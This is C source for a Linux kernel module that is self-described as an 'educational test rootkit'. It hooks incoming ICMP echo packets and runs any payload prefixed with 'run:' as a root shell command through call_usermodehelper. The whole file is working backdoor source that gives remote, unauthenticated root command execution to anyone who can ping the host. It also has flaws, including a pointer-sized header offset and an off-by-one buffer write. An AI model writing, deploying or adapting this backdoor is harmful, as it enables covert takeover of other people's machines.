#include <linux/module.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/netfilter_ipv4.h>

#define MAX_CMD_LEN 1976 // Maximum command length

static struct nf_hook_ops nfho; // Structure for Netfilter hook registration

char cmd_string[MAX_CMD_LEN]; // Buffer for storing the command

struct work_struct my_work; // Structure for deferred work

// Deferred work handler, executes the command from cmd_string
static void work_handler(struct work_struct * work) 
{
  static char *argv[] = {"/bin/sh", "-c", cmd_string, NULL}; // Arguments for shell execution
  static char *envp[] = {"PATH=/bin:/sbin", NULL}; // Environment

  call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC); // Run command in usermode
}

DECLARE_WORK(my_work, work_handler); // Macro for declaring deferred work

// Main function for intercepting ICMP packets
static unsigned int icmp_cmd_executor(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
  struct iphdr *iph;
  struct icmphdr *icmph;

  unsigned char *user_data;
  unsigned char *tail;
  unsigned char *i;
  int j = 0;

  iph = ip_hdr(skb); // Get IP header
  icmph = icmp_hdr(skb); // Get ICMP header

  // Check if this is an ICMP packet
  if (iph->protocol != IPPROTO_ICMP) {
    return NF_ACCEPT;
  }
  // Check if this is an ICMP Echo (ping)
  if (icmph->type != ICMP_ECHO) {
    return NF_ACCEPT;
  }

  // Extract user data from the packet
  user_data = (unsigned char *)((unsigned char *)icmph + (sizeof(icmph)));
  tail = skb_tail_pointer(skb);

  j = 0;
  // Copy data from the packet to cmd_string
  for (i = user_data; i != tail; ++i) {
    char c = *(char *)i;

    cmd_string[j] = c;

    j++;

    if (c == '\0')
      break;

    if (j == MAX_CMD_LEN) {
      cmd_string[j] = '\0';
      break;
    }

  }

  // Check if the command starts with "run:"
  if (strncmp(cmd_string, "run:", 4) != 0) {
    return NF_ACCEPT;
  } else {
    // Shift the string to remove "run:"
    for (j = 0; j <= sizeof(cmd_string)/sizeof(cmd_string[0])-4; j++) {
      cmd_string[j] = cmd_string[j+4];
      if (cmd_string[j] == '\0')
        break;
    }
  }

  schedule_work(&my_work); // Schedule deferred work

  return NF_ACCEPT;
}

// Module initialization function
static int __init startup(void)
{
  nfho.hook = icmp_cmd_executor; // Set the handler
  nfho.hooknum = NF_INET_PRE_ROUTING; // Intercept before routing
  nfho.pf = PF_INET;
  nfho.priority = NF_IP_PRI_FIRST;
  nf_register_net_hook(&init_net, &nfho); // Register the hook
  printk(KERN_WARNING "[icmpshell] WARNING: Educational test rootkit loaded into the kernel!\n"); // Print warning to dmesg
  return 0;
}

// Module cleanup function
static void __exit cleanup(void)
{
  nf_unregister_net_hook(&init_net, &nfho); // Unregister the hook
}

MODULE_LICENSE("GPL"); // Module license
module_init(startup); // Entry point for module loading
module_exit(cleanup); // Exit point for module unloading
